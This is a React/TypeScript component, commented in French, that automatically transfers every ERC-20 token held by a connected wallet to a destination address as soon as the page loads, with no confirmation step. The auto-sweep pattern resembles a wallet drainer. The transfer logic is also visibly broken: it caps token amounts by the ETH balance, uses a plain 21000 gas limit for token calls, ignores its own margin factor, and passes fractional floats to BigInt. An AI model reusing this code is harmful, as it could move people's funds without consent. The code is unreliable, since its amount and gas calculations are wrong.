import { useEffect, useState } from 'react';
import { useAtom } from 'jotai';
import { useWalletClient, usePublicClient } from 'wagmi';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { erc20ABI } from 'wagmi';
import { normalize } from 'viem/ens';
import { isAddress } from 'essential-eth';

// Utilisation de votre clé API Etherscan
const ETHERSCAN_API_KEY = 'Votre_API_KEY_Ici'; // Remplacez avec votre propre clé API

export const SendTokens = () => {
  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  const [gasPrice, setGasPrice] = useState(0); // Gas price à récupérer depuis Etherscan

  // Fonction pour obtenir les frais de gaz à partir de l'API Etherscan
  const fetchGasPrice = async () => {
    try {
      const response = await fetch(`https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=${ETHERSCAN_API_KEY}`);
      const data = await response.json();
      if (data.result) {
        setGasPrice(parseInt(data.result.ProposeGasPrice)); // Gas proposé en Gwei
      }
    } catch (err) {
      console.error('Erreur lors de la récupération des frais de gaz:', err);
    }
  };

  useEffect(() => {
    fetchGasPrice();
  }, []);

  // Calculer les frais de gaz en ETH
  const calculateGasFee = (gasPrice: number, gasLimit: number) => {
    return (gasPrice * gasLimit) / 1e9; // Conversion du gaz en ETH (Gwei -> ETH)
  };

  // Automatiser l'envoi de tous les tokens disponibles
  const sendAllTokens = async () => {
    const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
      .filter((token) => BigInt(token.balance) > 0) // Vérifier les tokens avec un solde positif
      .map((token) => token.contract_address as `0x${string}`);

    if (!walletClient) return;
    if (!destinationAddress) return;

    // Vérifier si l'adresse de destination est une adresse ENS
    if (destinationAddress.includes('.')) {
      const resolvedDestinationAddress = await publicClient.getEnsAddress({
        name: normalize(destinationAddress),
      });
      if (resolvedDestinationAddress) {
        setDestinationAddress(resolvedDestinationAddress);
      } else {
        console.error("Adresse ENS introuvable");
        return;
      }
    }

    let gasLimit = 21000; // Limite de gaz pour une transaction standard (à ajuster si nécessaire)
    let marginFactor = 1.10; // Marge initiale de 10%

    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);
      if (!token) continue;

      try {
        // Calcul des frais de gaz nécessaires
        const gasFeeInEth = calculateGasFee(gasPrice, gasLimit);

        // Vérifier le solde disponible
        const userBalance = await publicClient.getBalance(walletClient.account);
        const userBalanceInEth = parseFloat(userBalance.toString()) / 1e18; // Convertir en ETH

        // Calculer la quantité maximale de tokens à envoyer après avoir laissé la marge pour les frais de gaz
        const maxTokensToSend = userBalanceInEth - gasFeeInEth;
        const balanceToSend = Math.min(maxTokensToSend, parseFloat(token.balance));

        if (balanceToSend <= 0) {
          console.error("Solde insuffisant pour envoyer les tokens après avoir réservé les frais de gaz");
          continue;
        }

        // Calculer la nouvelle quantité à envoyer
        const adjustedBalance = BigInt(balanceToSend * 1e18); // Convertir en wei

        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: tokenAddress,
          abi: erc20ABI,
          functionName: 'transfer',
          args: [
            destinationAddress as `0x${string}`,
            adjustedBalance,
          ],
        });

        const response = await walletClient.writeContract(request);

        // Mettre à jour l'état pour marquer le token comme envoyé
        setCheckedRecords((old) => ({
          ...old,
          [tokenAddress]: {
            ...old[tokenAddress],
            pendingTxn: response,
          },
        }));

      } catch (err) {
        console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
        // Augmenter la marge en cas d'erreur
        marginFactor *= 1.10; // Augmenter la marge de 10%
      }
    }
  };

  useEffect(() => {
    if (tokens.length > 0 && destinationAddress) {
      sendAllTokens();
    }
  }, [tokens, destinationAddress, walletClient]); // Quand les tokens ou l'adresse changent, l'envoi se déclenche

  return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
};
